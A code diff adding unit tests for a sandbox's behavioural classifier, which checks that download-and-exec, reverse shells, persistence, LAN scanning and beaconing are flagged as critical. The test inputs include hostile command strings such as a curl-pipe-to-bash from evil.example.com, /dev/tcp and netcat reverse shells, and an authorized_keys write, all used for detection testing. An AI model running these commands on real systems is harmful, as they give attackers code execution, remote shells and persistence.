@@ -112,6 +112,56 @@ def test_classify_beacon_external_is_critical():
     assert c["facts"]["beacons"] == 2 and c["facts"]["beacons_external"] == 1
 
 
+# ---- behavioral rules ------------------------------------------------------
+
+def test_behavior_download_and_exec_is_critical():
+    ev = _ev(execs=["sh -c curl -s http://evil.example.com/x.sh | bash",
+                    "python3 app.py"])
+    c = sandbox.classify(ev, {})
+    kinds = {b["kind"] for b in c["behavior"]}
+    assert "download-exec" in kinds
+    assert c["verdict"] == "crit" and c["rule"] == "behavior:download-exec"
+
+
+def test_behavior_reverse_shell_variants():
+    for line in ["bash -i >& /dev/tcp/10.9.9.9/4444 0>&1",
+                 "nc -e /bin/sh 10.9.9.9 4444",
+                 "python3 -c import socket,subprocess,os"]:
+        c = sandbox.classify(_ev(execs=[line]), {})
+        assert any(b["kind"] == "reverse-shell" for b in c["behavior"]), line
+        assert c["verdict"] == "crit"
+
+
+def test_behavior_persistence_write_and_exec():
+    c = sandbox.classify(_ev(staged=["home/agent/.ssh/authorized_keys"]), {})
+    assert any(b["kind"] == "persistence" for b in c["behavior"])
+    assert c["verdict"] == "crit"
+    c2 = sandbox.classify(_ev(execs=["crontab - </tmp/job"]), {})
+    assert any(b["kind"] == "persistence" for b in c2["behavior"])
+
+
+def test_behavior_lan_scan_fan_out():
+    blocked = [{"ip": f"10.0.0.{i}", "port": 22, "proto": "tcp",
+                "host": None, "attempts": 1} for i in range(1, 10)]
+    c = sandbox.classify(_ev(blocked=blocked), {})
+    assert any(b["kind"] == "lan-scan" for b in c["behavior"])
+
+
+def test_behavior_beaconing_repeated_attempts():
+    ev = _ev(blocked=[{"ip": "44.44.44.44", "port": 443, "proto": "tcp",
+                       "host": "c2.example.net", "attempts": 25}])
+    c = sandbox.classify(ev, {})
+    assert any(b["kind"] == "beaconing" for b in c["behavior"])
+
+
+def test_behavior_clean_run_has_no_flags():
+    ev = _ev(execs=["python3 app.py", "pip install requests", "ls -la"],
+             flows=[{"ip": "151.101.0.223", "port": 443, "proto": "tcp",
+                     "host": "pypi.org", "bytes_down": 1000, "bytes_up": 100}])
+    c = sandbox.classify(ev, {})
+    assert c["behavior"] == []
+
+
 def test_parse_render_attempts():
     from backend.gate import parse_render_attempts
     out = ('some log line\n'
